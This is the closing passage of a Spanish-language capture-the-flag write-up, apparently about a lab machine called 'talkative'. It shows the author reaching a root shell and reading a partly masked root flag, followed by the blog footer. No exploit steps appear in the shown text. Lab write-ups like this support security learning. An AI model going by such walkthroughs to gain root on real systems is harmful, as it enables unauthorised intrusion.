</span></span></code></pre></div><p>¡Nos convertimos en <code>root</code>!</p>
<p>Podemos leer la flag de <code>root</code> en condiciones.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@talkative:~# cat root.txt
</span></span><span style="display:flex;"><span>5f8e5df33844d4....
</span></span></code></pre></div><p>¡Y ya estaría!</p>
<p>Happy Hacking! 🚀</p>

    </div>

    

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            &copy; 2024, Andrés Del Cerro
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
